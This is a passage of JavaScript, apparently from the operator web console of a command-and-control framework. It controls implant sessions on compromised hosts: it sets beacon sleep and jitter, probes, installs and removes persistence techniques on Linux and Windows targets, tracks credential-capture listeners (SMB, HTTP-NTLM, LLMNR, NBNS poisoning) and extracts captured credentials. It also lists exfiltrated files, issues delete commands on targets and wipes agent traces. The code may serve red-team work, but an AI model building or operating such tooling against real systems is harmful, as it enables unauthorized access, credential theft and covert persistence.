  function stepSleep(delta) {
    const el = $('#sleep-val');
    if (!el) return;
    const v = Math.max(1, Math.min(86400, (parseInt(el.value) || 30) + delta));
    el.value = v;
  }

  function stepJitter(delta) {
    const el = $('#jitter-val');
    if (!el) return;
    const v = Math.max(0, Math.min(50, (parseInt(el.value) || 20) + delta));
    el.value = v;
  }

  async function doSleep() {
    if (!_activeId) return;
    const v = parseInt($('#sleep-val')?.value || 30);
    if (isNaN(v) || v < 1) { Toast.warning('Invalid', 'Sleep must be ≥ 1'); return; }
    try { await _sendBuiltin(() => API.sleep(_activeId, v), `/sleep ${v}`); }
    catch(e) { Toast.error('Sleep failed', e.message); }
  }

  async function doJitter() {
    if (!_activeId) return;
    const v = parseInt($('#jitter-val')?.value || 20);
    if (isNaN(v) || v < 0 || v > 50) { Toast.warning('Invalid', 'Jitter 0–50%'); return; }
    try { await _sendBuiltin(() => API.jitter(_activeId, v), `/jitter ${v}`); }
    catch(e) { Toast.error('Jitter failed', e.message); }
  }

  async function doPersist(action) {
    if (!_activeId) return;
    try {
      const r = await _sendBuiltin(() => API.persist(_activeId, action), `/persist ${action}`);
      if (action === 'check' && r?.cmd_id) _persistCheckIds.add(r.cmd_id);
    }
    catch(e) { Toast.error('Persist failed', e.message); }
  }

  async function doPersistProbeAll() {
    if (!_activeId) return;
    try {
      const btn = $('#ps-probe-btn');
      if (btn) { btn.disabled = true; btn.textContent = 'Probing…'; }
      const r = await _sendBuiltin(() => API.persistProbe(_activeId), '/persist probe');
      if (r?.cmd_id) _persistProbeIds.set(r.cmd_id, 'all');
    } catch(e) {
      Toast.error('Probe failed', e.message);
      _renderPersist();
    }
  }
  const doPersistProbe = doPersistProbeAll;

  async function doPersistProbeSelected() {
    if (!_activeId) return;
    const sel = _persistSelections[_activeId];
    if (!sel || sel.size === 0) return;
    const detectedOs = _detectPersistOs();
    const catalog    = detectedOs ? _PERSIST_CATALOG[detectedOs]
                                  : [..._PERSIST_CATALOG.linux, ..._PERSIST_CATALOG.windows];
    const ids = [...sel].filter(id => catalog.some(t => t.id === id)).join(',');
    if (!ids) return;
    try {
      const r = await _sendBuiltin(() => API.persistProbe(_activeId, ids), `/persist probe ${ids}`);
      if (r?.cmd_id) _persistProbeIds.set(r.cmd_id, 'selected');
    } catch(e) { Toast.error('Probe failed', e.message); }
  }

  function togglePersistSelect(id) {
    if (!_activeId) return;
    if (!_persistSelections[_activeId]) _persistSelections[_activeId] = new Set();
    const sel = _persistSelections[_activeId];
    if (sel.has(id)) sel.delete(id); else sel.add(id);
    _renderPersist();
  }

  function togglePersistSelectAll() {
    if (!_activeId) return;
    const detectedOs = _detectPersistOs();
    const catalog    = detectedOs ? _PERSIST_CATALOG[detectedOs]
                                  : [..._PERSIST_CATALOG.linux, ..._PERSIST_CATALOG.windows];
    if (!_persistSelections[_activeId]) _persistSelections[_activeId] = new Set();
    const sel = _persistSelections[_activeId];
    if (catalog.every(t => sel.has(t.id))) {
      catalog.forEach(t => sel.delete(t.id));
    } else {
      catalog.forEach(t => sel.add(t.id));
    }
    _renderPersist();
  }

  async function doPersistInstall(technique) {
    if (!_activeId) return;
    const sid = _activeId;
    try {
      const r = await _sendBuiltin(() => API.persistInstall(sid, technique), `/persist install ${technique}`);
      if (r?.cmd_id && r?.ok !== false) _persistCmdIds.set(r.cmd_id, { op: 'install', tid: technique, sid });
    } catch(e) { Toast.error('Install failed', e.message); }
  }

  async function doPersistInstallSelected() {
    if (!_activeId) return;
    const sel = _persistSelections[_activeId];
    if (!sel || sel.size === 0) return;
    const sid = _activeId;
    const detectedOs = _detectPersistOs();
    const catalog    = detectedOs ? _PERSIST_CATALOG[detectedOs]
                                  : [..._PERSIST_CATALOG.linux, ..._PERSIST_CATALOG.windows];
    const toInstall  = catalog.filter(t => sel.has(t.id));
    for (const t of toInstall) {
      try {
        const r = await _sendBuiltin(() => API.persistInstall(sid, t.id), `/persist install ${t.id}`);
        if (r?.cmd_id && r?.ok !== false) _persistCmdIds.set(r.cmd_id, { op: 'install', tid: t.id, sid });
      } catch(e) { Toast.error(`Install ${t.id} failed`, e.message); break; }
    }
  }

  async function doPersistRemove(technique) {
    if (!_activeId) return;
    const ok = await confirm('Remove Persistence', `Remove "${technique}" from target?`);
    if (!ok) return;
    const sid = _activeId;
    try {
      const r = await _sendBuiltin(() => API.persistRemove(sid, technique), `/persist remove ${technique}`);
      if (r?.cmd_id && r?.ok !== false) _persistCmdIds.set(r.cmd_id, { op: 'remove', tid: technique, sid });
    } catch(e) { Toast.error('Remove failed', e.message); }
  }

  async function doPersistRemoveSelected() {
    if (!_activeId) return;
    const sel = _persistSelections[_activeId];
    if (!sel || sel.size === 0) return;
    const sid = _activeId;
    const detectedOs = _detectPersistOs();
    const catalog    = detectedOs ? _PERSIST_CATALOG[detectedOs]
                                  : [..._PERSIST_CATALOG.linux, ..._PERSIST_CATALOG.windows];
    const toRemove   = catalog.filter(t => sel.has(t.id));
    const names      = toRemove.map(t => t.id).join(', ');
    const ok = await confirm('Remove Persistence', `Remove ${toRemove.length} technique(s) from target?\n${names}`);
    if (!ok) return;
    for (const t of toRemove) {
      try {
        const r = await _sendBuiltin(() => API.persistRemove(sid, t.id), `/persist remove ${t.id}`);
        if (r?.cmd_id && r?.ok !== false) _persistCmdIds.set(r.cmd_id, { op: 'remove', tid: t.id, sid });
      } catch(e) { Toast.error(`Remove ${t.id} failed`, e.message); break; }
    }
  }

  async function doPersistStatus(technique) {
    if (!_activeId) return;
    const sid = _activeId;
    try {
      const r = await _sendBuiltin(() => API.persistStatus(sid, technique), `/persist status ${technique}`);
      if (r?.cmd_id && r?.ok !== false) _persistCmdIds.set(r.cmd_id, { op: 'status', tid: technique, sid });
    } catch(e) { Toast.error('Status failed', e.message); }
  }

  async function doKillSession(id) {
    const target = id || _activeId;
    if (!target) return;
    const s = _sessions[target];
    if (s && s.locked) { Toast.warning('Session locked', 'Unlock the session before removing'); return; }
    const ok = await confirm('Remove Session', `Remove session ${target.slice(0,8)}? This only removes the local record — no files are deleted.`);
    if (!ok) return;
    try {
      await API.killSession(target);
      remove(target);
    } catch(e) { Toast.error('Remove failed', e.message); }
  }

  const _WIPE_STEPS = [
    { id: 'kill',           label: 'Send KILL to agent' },
    { id: 'remove',         label: 'Remove session from manager' },
    { id: 'session_json',   label: 'Delete session profile' },
    { id: 'cloud_cleanup',  label: 'Cloud cleanup — running in background (folder + files)' },
    { id: 'deploy_dir',     label: 'Delete deployment directory' },
    { id: 'uploads',        label: 'Delete upload records' },
    { id: 'downloads',      label: 'Delete downloaded files' },
    { id: 'history',        label: 'Delete history log' },
  ];

  function _initWipeProgress(deleteHistory, deleteDeploy, deleteDownloads) {
    const container = document.getElementById('wipe-steps');
    if (!container) return;
    const steps = _WIPE_STEPS.map(s => {
      if (s.id === 'deploy_dir' && !deleteDeploy)
        return { ...s, label: 'Deployment directory — preserved', _skip: true };
      if (s.id === 'downloads' && !deleteDownloads)
        return { ...s, label: 'Downloaded files — preserved', _skip: true };
      if (s.id === 'history' && !deleteHistory)
        return { ...s, label: 'History log — preserved', _skip: true };
      return s;
    });
    container.innerHTML = steps.map(s => `
      <div class="wipe-step ${s._skip ? 'skip' : 'pending'}" id="wipe-step-${s.id}">
        <span class="wipe-icon"></span>
        <div class="wipe-body">
          <div class="wipe-label">${escHtml(s.label)}</div>
          <div class="wipe-files"></div>
        </div>
      </div>`).join('');
  }

  function _showWipeClose(onClose) {
    const footer = document.getElementById('wipe-progress-footer');
    const btn    = document.getElementById('wipe-progress-close');
    if (!footer || !btn) { onClose?.(); return; }
    footer.style.display = '';
    btn.onclick = () => { footer.style.display = 'none'; onClose?.(); };
  }

  function _updateWipeStep(evt) {
    const el = document.getElementById(`wipe-step-${evt.step}`);
    if (!el) return;
    el.className = `wipe-step ${evt.status}`;
    if (evt.files && evt.files.length) {
      el.querySelector('.wipe-files').innerHTML =
        evt.files.map(f => `<div class="wipe-file">${escHtml(f)}</div>`).join('');
    }
    if (evt.detail && !evt.files?.length) {
      el.querySelector('.wipe-files').innerHTML =
        `<div class="wipe-file">${escHtml(evt.detail)}</div>`;
    }
  }

  async function doWipeSession() {
    const target = _activeId;
    if (!target) return;
    const s = _sessions[target];
    if (s && s.locked) { Toast.warning('Session locked', 'Unlock the session before wiping'); return; }
    const res = await confirmTyped(
      'Remove & Clean Up',
      'This will send KILL to the agent and remove the session from the manager. Keys, logs and deployment directory deletion is optional below.',
      'delete all files',
      [
        { id: 'deleteDeploy',     label: 'Also delete deployment directory (keys, stage2, artifacts)', defaultChecked: false },
        { id: 'deleteDownloads',  label: 'Also delete downloaded files (downloads/<session>/)', defaultChecked: false },
        { id: 'deleteHistory',    label: 'Also delete command history log', defaultChecked: false },
      ]
    );
    if (!res.ok) return;

    _initWipeProgress(res.deleteHistory, res.deleteDeploy, res.deleteDownloads);
    const _wpFooter = document.getElementById('wipe-progress-footer');
    if (_wpFooter) _wpFooter.style.display = 'none';
    Modal.open('wipe-progress-modal');

    try {
      const response = await fetch(`/api/v1/sessions/${target}/wipe`, {
        method:      'POST',
        credentials: 'same-origin',
        headers:     { 'Content-Type': 'application/json' },
        body: JSON.stringify({ delete_history: res.deleteHistory, delete_deploy: res.deleteDeploy, delete_downloads: res.deleteDownloads }),
      });

      if (!response.ok) {
        const err = await response.json().catch(() => ({}));
        throw new Error(err.detail || `HTTP ${response.status}`);
      }

      const reader  = response.body.getReader();
      const decoder = new TextDecoder();
      let   buf     = '';

      // Mark all non-skip steps as running
      _WIPE_STEPS.forEach(s => {
        const el = document.getElementById(`wipe-step-${s.id}`);
        if (el && el.classList.contains('pending')) el.className = 'wipe-step running';
      });

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += decoder.decode(value, { stream: true });
        const lines = buf.split('\n');
        buf = lines.pop();          // keep incomplete last line
        for (const line of lines) {
          if (!line.startsWith('data: ')) continue;
          try {
            const evt = JSON.parse(line.slice(6));
            if (evt.step === 'done') {
              _showWipeClose(() => Modal.close('wipe-progress-modal'));
              // Row stays visible with 'wiping' badge — session.wipe_done WS will remove it
            } else {
              _updateWipeStep(evt);
            }
          } catch {}
        }
      }
    } catch(e) {
      _showWipeClose(() => Modal.close('wipe-progress-modal'));
      Toast.error('Wipe failed', e.message);
    }
  }

  /* ── WS state mutations ──────────────────────────────────────────────────── */
  function upsert(s) {
    s.id = s.id || s.session_id;
    if (!s.id) return;
    const prev = _sessions[s.id];
    /* stamp the moment JS received a new heartbeat — this is what we display */
    if (s.last_hb_ts && s.last_hb_ts !== prev?.last_hb_ts) {
      s._localSeenAt = Date.now() / 1000;   /* Unix seconds (float) */
    } else if (prev?._localSeenAt) {
      s._localSeenAt = prev._localSeenAt;   /* carry forward */
    }
    const prevOs = prev?.target_os || '';
    _sessions[s.id] = s;
    let _persistChanged = false;
    if (s.persist_probe_data && Object.keys(s.persist_probe_data).length) {
      if (!_persistProbeData[s.id]) _persistProbeData[s.id] = {};
      for (const [tid, data] of Object.entries(s.persist_probe_data)) {
        const prev_status = _persistProbeData[s.id][tid]?.status;
        _persistProbeData[s.id][tid] = {
          id: tid,
          status: data.status,
          priv: data.scope,
          desc: data.detail
        };
        if (data.status !== prev_status) _persistChanged = true;
      }
    }
    renderList();
    if (s.id === _activeId) {
      _renderDetail();
      if (!prevOs && s.target_os && $('#tp-persist.on')) _renderPersist();
      else if (_persistChanged && $('#tp-persist.on')) _renderPersist();
      if ($('#tp-info.on')) _renderInfo();
    }
  }

  function remove(id) {
    delete _sessions[id];
    if (_activeId === id) {
      _activeId = null;
      const empty  = $('#empty-state');
      const hdr    = $('#sess-header');
      const tabBar = $('#tab-bar');
      const tabCnt = $('#tab-content');
      const pb     = $('#pending-bar');
      if (empty)  empty.style.display  = '';
      if (hdr)    hdr.style.display    = 'none';
      if (tabBar) tabBar.style.display = 'none';
      if (tabCnt) tabCnt.style.display = 'none';
      if (pb)     pb.classList.remove('visible');
    }
    renderList();
  }

  function setAll(list) {
    _sessions = {};
    (list || []).forEach(s => {
      const key = s.id || s.session_id;
      if (!key) return;
      s.id = key;
      _sessions[key] = s;
      if (s.persist_probe_data && Object.keys(s.persist_probe_data).length) {
        if (!_persistProbeData[key]) _persistProbeData[key] = {};
        for (const [tid, data] of Object.entries(s.persist_probe_data)) {
          _persistProbeData[key][tid] = {
            id: tid,
            status: data.status,
            priv: data.scope,
            desc: data.detail
          };
        }
      }
    });
    renderList();
    if (_activeId && !_sessions[_activeId]) {
      _activeId = null;
      const empty  = $('#empty-state');
      const hdr    = $('#sess-header');
      const tabBar = $('#tab-bar');
      const tabCnt = $('#tab-content');
      const pb     = $('#pending-bar');
      if (empty)  empty.style.display  = '';
      if (hdr)    hdr.style.display    = 'none';
      if (tabBar) tabBar.style.display = 'none';
      if (tabCnt) tabCnt.style.display = 'none';
      if (pb)     pb.classList.remove('visible');
    }
  }

  function onOutput(cmd_id, content, error = false, remote_cwd = '', session_id = '') {
    if (remote_cwd && session_id && _sessions[session_id]) {
      _sessions[session_id].remote_cwd = remote_cwd;
    }
    _localCmdIds.delete(cmd_id);
    _setOutput(cmd_id, content, error);
    /* Clear pending bar when output arrives — the server already cleared
       the pending lock, but the UI only refreshes it on session.update
       which may lag behind by up to STATE_POLL_INTERVAL seconds. */
    const pb = $('#pending-bar');
    if (pb) pb.classList.remove('visible');
    if (_persistCheckIds.has(cmd_id)) {
      _persistCheckIds.delete(cmd_id);
      setTimeout(() => { if ($('#tp-persist.on')) _renderPersist(); }, 600);
    }
    if (_persistProbeIds.has(cmd_id)) {
      _persistProbeIds.delete(cmd_id);
      if (content && content.includes('PROBE:')) {
        const parsed = _parsePersistProbe(content);
        const sid = session_id || _activeId;
        if (sid && Object.keys(parsed).length > 0) {
          if (!_persistProbeData[sid]) _persistProbeData[sid] = {};
          Object.assign(_persistProbeData[sid], parsed);
          // Always render, even if tab isn't open yet
          setTimeout(() => _renderPersist(), 50);
        }
      }
    }
    if (_persistCmdIds.has(cmd_id)) {
      const { op, tid, sid } = _persistCmdIds.get(cmd_id);
      _persistCmdIds.delete(cmd_id);
      if (!error && content) {
        const newStatus = _inferPersistStatus(op, content);
        if (newStatus !== null) {
          const tsid = sid || session_id || _activeId;
          if (tsid) {
            if (!_persistProbeData[tsid]) _persistProbeData[tsid] = {};
            if (!_persistProbeData[tsid][tid]) _persistProbeData[tsid][tid] = { id: tid };
            _persistProbeData[tsid][tid].status = newStatus;
            if (tsid === _activeId && $('#tp-persist.on')) _updatePersistRow(tid, newStatus);
          }
        }
      }
    }
    if (_sysinfoRunning.has(cmd_id)) {
      _sysinfoRunning.delete(cmd_id);
      const sid = session_id || _activeId;
      const body = document.getElementById('info-sysinfo-body');
      if (body) delete body.dataset.loaded;  // always invalidate so next tab-open reloads
      if (sid === _activeId) {
        if ($('#tp-info.on')) _loadSysinfoSection(sid);
      }
    }
    // Refresh Artifacts for any operator on this session when a download completes
    const isDownloadDone = !error && content && content.includes('check Artifacts');
    if (_downloadCmdIds.has(cmd_id) || (isDownloadDone && session_id === _activeId)) {
      _downloadCmdIds.delete(cmd_id);
      setTimeout(() => { if ($('#tp-artifacts.on')) _loadArtifacts(); }, 400);
    }
    // Handle upload delete command completion
    if (_deletingUploads.has(cmd_id)) {
      const { remote_path, row } = _deletingUploads.get(cmd_id);
      _deletingUploads.delete(cmd_id);
      if (!error) {
        API.markUploadRemoved(session_id || _activeId, remote_path).catch(() => {});
        if (row) _ulMarkRowRemoved(row);
      } else {
        Toast.error('Delete failed', `Could not delete from target: ${content}`);
        if (row) {
          const btn = row.querySelector('.js-ul-delete');
          if (btn) { btn.disabled = false; btn.innerHTML = `${_icoTras} Delete`; }
        }
      }
    }
    // Live-update History tab when a command completes for the active session
    const _histSid = session_id || _activeId;
    if (_histSid === _activeId && $('#tp-history.on')) _renderHistory();

    // ── Listen badge: detect listener start/stop/dump from agent response ──
    // listen_dump() output with credentials starts with "[SMB:445]" etc, no "[creds listen]" prefix
    if (content && (content.includes('[creds listen]') || /\[(SMB|HTTP[-\w]*):(\d+)\]\s+\d+\s+credential/i.test(content))) {
      const sid = session_id || _activeId;
      if (sid) {
        if (!_listenActive[sid]) _listenActive[sid] = { listeners: {} };
        const la = _listenActive[sid].listeners;

        if (content.includes('Active:')) {
          // "[creds listen] Active: HTTP-NTLM:80 + LLMNR + NBNS"
          const m = content.match(/Active:\s*(.+?)(?:\n|$)/);
          if (m) {
            const parts = m[1].split('+').map(p => p.trim());
            const now = new Date().toISOString();
            for (const part of parts) {
              const pm = part.match(/^(SMB|HTTP-NTLM|HTTP):(\d+)$/i);
              if (pm) {
                const raw = pm[1].toLowerCase();
                const proto = raw.includes('ntlm') ? 'http-ntlm' : raw.includes('http') ? 'http' : 'smb';
                const port = parseInt(pm[2]);
                const key = `${proto}:${port}`;
                if (!la[key]) la[key] = { proto, port, started_at: now, creds: [] };
              }
            }
          }
        } else if (content.includes('Stopped') && content.includes('listener(s)')) {
          // Stop all
          _listenActive[sid].listeners = {};
        } else if (content.includes('Stopped') && !content.includes('listener(s)')) {
          // Stop specific: "Stopped http:80."
          const m = content.match(/Stopped\s+([\w]+:\d+)/);
          if (m) delete la[m[1]];
        } else {
          // Dump: parse per-listener credential lines
          let currentKey = null;
          for (const line of content.split('\n')) {
            const hdr = line.match(/^\[([\w-]+):(\d+)\]\s+(\d+)\s+credential/i);
            if (hdr) {
              const raw = hdr[1].toLowerCase();
              const proto = raw.includes('ntlm') ? 'http-ntlm' : raw.includes('http') ? 'http' : 'smb';
              const port = parseInt(hdr[2]);
              currentKey = `${proto}:${port}`;
              if (!la[currentKey]) la[currentKey] = { proto, port, started_at: new Date().toISOString(), creds: [] };
              continue;
            }
            if (currentKey && line.startsWith('  ') && line.trim()) {
              const cred = line.trim();
              const entry = la[currentKey];
              if (entry && !entry.creds.includes(cred)) entry.creds.push(cred);
            }
          }
        }
        if (sid === _activeId) _updateListenBadge();
      }
    }

    // ── Auto-extract credentials from /creds output ──
    if (content && (content.includes('[creds') || /\[(SMB|HTTP[-\w]*):(\d+)\]\s+\d+\s+credential/i.test(content))) {
      _credsAutoExtract(content, session_id || _activeId);
    }
  }

  function onHeartbeat(session_id, state) {
    if (!_sessions[session_id]) return;
    const hbTs = state.last_hb_ts || state.last_heartbeat || '';
    if (hbTs && hbTs !== _sessions[session_id].last_hb_ts) {
      _sessions[session_id].last_hb_ts   = hbTs;
      _sessions[session_id]._localSeenAt = Date.now() / 1000;
    }
    if (state.last_seen_at != null) _sessions[session_id].last_seen_at = state.last_seen_at;
    if (state.alive === false) _sessions[session_id].state = 'dead';

    const dispTs = String(_sessions[session_id]._localSeenAt || _sessions[session_id].last_seen_at || hbTs);
    const sess        = _sessions[session_id];
    const st          = _sessionStatus(sess);
    const sleepMs     = (sess?.agent_sleep || 30) * 1000;
    const baseMsForNc = sess?._localSeenAt ? (sess._localSeenAt * 1000) : _tsToMs(hbTs);
    const ncMs        = (baseMsForNc && !isNaN(baseMsForNc)) ? (baseMsForNc + sleepMs) : NaN;

    const tr = $(`#sess-tbody tr[data-id="${CSS.escape(session_id)}"]`);
    if (tr) {
      const dotEl = tr.querySelector('.st-pill');
      const hbEl  = tr.querySelector('.hb-val');
      const ncEl  = tr.querySelector('.nc-val');
      if (dotEl) { dotEl.className = `st-pill ${st}`; dotEl.innerHTML = _stLabel(st); }
      if (hbEl)  { hbEl.dataset.hb = dispTs; hbEl.textContent = fmtAge(dispTs); }
      if (ncEl)  { ncEl.dataset.nc = isNaN(ncMs) ? '' : ncMs; ncEl.textContent = fmtUntil(ncMs); }
    }

    if (session_id === _activeId) {
      const pill    = $('#sh-status-pill');
      const pillTxt = $('#sh-status-txt');
      const hbMeta  = $('#sh-meta [data-key="hb"] .v');
      if (pill)    pill.className      = `status-pill ${st}`;
      if (pillTxt) pillTxt.textContent = st;
      if (hbMeta)  hbMeta.textContent  = fmtAge(dispTs);
      if ($('#tp-info.on')) {
        const infoInner = $('#info-inner');
        const infoHb    = document.getElementById('info-hb-val');
        if (infoHb) infoHb.textContent = fmtAge(dispTs);
        if (infoInner) {
          const stCell = infoInner.querySelectorAll('.info-cell')[1]?.querySelector('.info-v');
          if (stCell) stCell.textContent = st;
        }
      }
    }
  }

  /* ── col resize ──────────────────────────────────────────────────────────── */
  function _initColResize(tableIdOrEl, storageKey) {
    const tbl = typeof tableIdOrEl === 'string'
      ? document.getElementById(tableIdOrEl) : tableIdOrEl;
    if (!tbl) return;
    // Remove any stale handles from a previous render
    $$('.col-resizer', tbl).forEach(h => h.remove());
    const ths = $$('thead th', tbl);

    // Restore saved widths
    if (storageKey) {
      try {
        const saved = JSON.parse(localStorage.getItem(storageKey) || 'null');
        if (saved) {
          tbl.style.tableLayout = 'fixed';
          ths.forEach((th, i) => { if (saved[i]) th.style.width = saved[i]; });
        }
      } catch (_) {}
    }

    const _saveWidths = () => {
      if (!storageKey) return;
      const widths = ths.map(th => th.style.width || '');
      localStorage.setItem(storageKey, JSON.stringify(widths));
    };

    ths.forEach((th, i) => {
      if (i === ths.length - 1) return;           // skip last column
      const handle = document.createElement('div');
      handle.className = 'col-resizer';
      th.appendChild(handle);
      handle.addEventListener('mousedown', e => {
        e.preventDefault();
        _resizingCol = true;
        if (tbl.style.tableLayout !== 'fixed') {
          ths.forEach(h => { h.style.width = h.offsetWidth + 'px'; });
          tbl.style.tableLayout = 'fixed';
        }
        const startX     = e.clientX;
        const startWidth = th.offsetWidth;
        handle.classList.add('resizing');
        document.body.style.cursor = 'col-resize';
        const onMove = ev => { th.style.width = Math.max(40, startWidth + ev.clientX - startX) + 'px'; };
        const onUp   = () => {
          _resizingCol = false;
          handle.classList.remove('resizing');
          document.body.style.cursor = '';
          _saveWidths();
          document.removeEventListener('mousemove', onMove);
          document.removeEventListener('mouseup',   onUp);
        };
        document.addEventListener('mousemove', onMove);
        document.addEventListener('mouseup',   onUp);
      });
    });
  }

  /* ── col drag-reorder (session table) ────────────────────────────────────── */
  function _initSessColDrag() {
    const tbl = $('#sess-table');
    if (!tbl) return;
    $$('thead th[draggable]', tbl).forEach(th => {
      th.addEventListener('dragstart', e => {
        if (_resizingCol) { e.preventDefault(); return; }
        e.dataTransfer.effectAllowed = 'move';
        e.dataTransfer.setData('text/plain', th.dataset.col);
        th.classList.add('col-dragging');
      });
      th.addEventListener('dragend', () => {
        th.classList.remove('col-dragging');
        $$('thead th.col-drag-over', tbl).forEach(h => h.classList.remove('col-drag-over'));
      });
      th.addEventListener('dragover', e => {
        e.preventDefault();
        e.dataTransfer.dropEffect = 'move';
        th.classList.add('col-drag-over');
      });
      th.addEventListener('dragleave', () => th.classList.remove('col-drag-over'));
      th.addEventListener('drop', e => {
        e.preventDefault();
        th.classList.remove('col-drag-over');
        const fromKey = e.dataTransfer.getData('text/plain');
        const toKey   = th.dataset.col;
        if (fromKey === toKey) return;
        const fromIdx = _sessColOrder.indexOf(fromKey);
        const toIdx   = _sessColOrder.indexOf(toKey);
        if (fromIdx < 0 || toIdx < 0) return;
        _sessColOrder.splice(fromIdx, 1);
        _sessColOrder.splice(toIdx, 0, fromKey);
        localStorage.setItem('sess-col-order', JSON.stringify(_sessColOrder));
        localStorage.removeItem('colw:sess-table');
        renderList();
      });
    });
  }

  function init() {
    _initColResize('hist-tbl',       'colw:hist-tbl');
    _initColResize('artifacts-tbl',  'colw:artifacts-tbl');
    _initColResize('ontarget-tbl',   'colw:ontarget-tbl');
    _initColResize('uploads-tbl',    'colw:uploads-tbl');
    $$('.tab').forEach(btn => {
      btn.addEventListener('click', () => { if (btn.dataset.tab) _switchTab(btn.dataset.tab); });
    });

    document.addEventListener('click', e => {
      const segBtn = e.target.closest('#exfil-seg .seg-btn');
      if (segBtn) {
        _exfilShowPath = segBtn.dataset.mode === 'path';
        $$('#exfil-seg .seg-btn').forEach(b => b.classList.toggle('active', b === segBtn));
        _loadArtifacts();
        return;
      }

      const showBtn = e.target.closest('.js-show-file');
      if (showBtn) { _showFilePreview(showBtn.dataset.url, showBtn.dataset.name, showBtn.dataset.size, showBtn.dataset.type, showBtn.dataset.md5); return; }

      const delBtn = e.target.closest('.js-del-file');
      if (delBtn) {
        confirm('Delete file', `Delete ${delBtn.dataset.name} from disk?`).then(async ok => {
          if (!ok) return;
          try {
            await API.deleteDownload(_activeId, delBtn.dataset.rel);
            delBtn.closest('tr')?.remove();
            const tbody = $('#artifacts-tbody');
            if (tbody && !tbody.querySelector('tr')) {
              tbody.innerHTML = '<tr><td colspan="6" class="ts" style="text-align:center;padding:1rem">No exfiltrated files for this session</td></tr>';
            }
          } catch (err) {
            Toast.error('Delete failed', err.message || String(err));
          }
        });
        return;
      }

      const ulDelBtn = e.target.closest('.js-ul-delete');
      if (ulDelBtn) {
        const remotePath = ulDelBtn.dataset.rpath;
        const fname      = ulDelBtn.dataset.name;
        confirm('Delete from target', `Send a delete command for ${fname} on the target?`).then(async ok => {
          if (!ok) return;
          const sess = _sessions[_activeId];
          const isWin = (sess?.target_os || '').toLowerCase().includes('windows');
          const cmd   = isWin
            ? `Remove-Item '${remotePath}' -Force -ErrorAction SilentlyContinue`
            : `rm -f '${remotePath}'`;
          try {
            const r = await API.sendCommand(_activeId, cmd, `/upload delete ${fname}`);
            if (r && r.ok === false) {
              Toast.warning('Command blocked', r.locked_by ? `Lock held by '${r.locked_by}'` : 'Another operator holds the lock');
              return;
            }
            const cmdId = r?.cmd_id;
            if (cmdId) {
              _localCmdIds.add(cmdId);
              _deletingUploads.set(cmdId, { remote_path: remotePath, row: ulDelBtn.closest('tr') });
            }
            ulDelBtn.disabled = true;
            ulDelBtn.innerHTML = 'Deleting…';
          } catch (err) {
            Toast.error('Delete failed', err.message || String(err));
          }
        });
        return;
      }

      const ulMarkBtn = e.target.closest('.js-ul-mark');
      if (ulMarkBtn) {
        const remotePath = ulMarkBtn.dataset.rpath;
        const fname      = ulMarkBtn.dataset.name;
        confirm('Mark as removed', `Mark ${fname} as removed? The record is kept — no shell command is sent.`).then(async ok => {
          if (!ok) return;
          try {
            await API.markUploadRemoved(_activeId, remotePath);
            const tr = ulMarkBtn.closest('tr');
            if (tr) _ulMarkRowRemoved(tr);
          } catch (err) {
            Toast.error('Mark failed', err.message || String(err));
          }
        });
        return;
      }

      const ulRestoreBtn = e.target.closest('.js-ul-restore');
      if (ulRestoreBtn) {
        const remotePath = ulRestoreBtn.dataset.rpath;
        API.restoreUpload(_activeId, remotePath)
          .then(() => { const tr = ulRestoreBtn.closest('tr'); if (tr) _ulMarkRowRestored(tr); })
          .catch(err => Toast.error('Restore failed', err.message || String(err)));
        return;
      }

      // Credential tab actions
      const credShowBtn = e.target.closest('.cred-show');
      if (credShowBtn) {
        const tr = credShowBtn.closest('tr');
        const credId = tr?.dataset.credId;
        const creds = _credsCache[_activeId] || [];
        const c = creds.find(x => x.id === credId);
        if (c) _showCredDetail(c);
        return;
      }

      const credEditBtn = e.target.closest('.cred-edit');
      if (credEditBtn) {
        const tr = credEditBtn.closest('tr');
        const credId = tr?.dataset.credId;
        const creds = _credsCache[_activeId] || [];
        const c = creds.find(x => x.id === credId);
        if (c) _openCredModal(c);
        return;
      }

      const credDelBtn = e.target.closest('.cred-del');
      if (credDelBtn) {
        const tr = credDelBtn.closest('tr');
        const credId = tr?.dataset.credId;
        if (credId) {
          confirm('Delete credential', 'Remove this credential entry?').then(ok => {
            if (ok) _deleteCred(credId);
          });
        }
        return;
      }

      const credSecret = e.target.closest('.cred-secret');
      if (credSecret) {
        navigator.clipboard.writeText(credSecret.textContent).then(() => {
          Toast.show('ok', 'Copied to clipboard');
        });
        return;
      }
    });

    // Upload modal close buttons
    $('#upload-modal-close')?.addEventListener('click',  () => Modal.close('upload-modal'));
    $('#upload-modal-cancel')?.addEventListener('click', () => Modal.close('upload-modal'));

    const inp = $('#cmd-in');
    if (inp) {
      inp.addEventListener('input', () => _suggestUpdate(inp.value));
      inp.addEventListener('blur',  () => setTimeout(_suggestHide, 150));
      inp.addEventListener('keydown', e => {
        if (e.key === 'Escape') {
          _suggestHide();
        } else if (e.key === 'Tab') {
          if (_suggestItems.length) { e.preventDefault(); _suggestAccept(_suggestIdx); }
        } else if (e.key === 'ArrowUp') {
          e.preventDefault();
          if (_suggestItems.length) { _suggestMove(-1); }
          else {
            _cmdHistIdx = Math.min(_cmdHistIdx + 1, _cmdHistory.length - 1);
            if (_cmdHistory[_cmdHistIdx] !== undefined) inp.value = _cmdHistory[_cmdHistIdx];
          }
        } else if (e.key === 'ArrowDown') {
          e.preventDefault();
          if (_suggestItems.length) { _suggestMove(1); }
          else {
            _cmdHistIdx = Math.max(_cmdHistIdx - 1, -1);
            inp.value = _cmdHistIdx >= 0 ? (_cmdHistory[_cmdHistIdx] || '') : '';
          }
        } else if (e.key === 'Enter' && !e.shiftKey) {
          e.preventDefault();
          if (_suggestIdx >= 0 && _suggestItems.length) { _suggestAccept(_suggestIdx); }
          else { _suggestHide(); _sendCmd(inp.value); }
        }
      });
    }

    const sendBtn = $('#btn-send');
    if (sendBtn) sendBtn.addEventListener('click', () => { const i = $('#cmd-in'); if (i) _sendCmd(i.value); });

    /* ── Auto-scroll: MutationObserver on #shell-hist ──────────────────────── */
    const shellHist = $('#shell-hist');
    if (shellHist) {
      shellHist.addEventListener('scroll', () => {
        const gap = shellHist.scrollHeight - shellHist.scrollTop - shellHist.clientHeight;
        _shellUserScrolled = gap > 60;
      });
      const _autoScroll = () => {
        if (!_shellUserScrolled) shellHist.scrollTop = shellHist.scrollHeight;
      };
      new MutationObserver(_autoScroll).observe(shellHist, { childList: true, subtree: true, characterData: true });
    }

    const pollBtn = $('#btn-poll-toggle');
    if (pollBtn) {
      pollBtn.addEventListener('click', async () => {
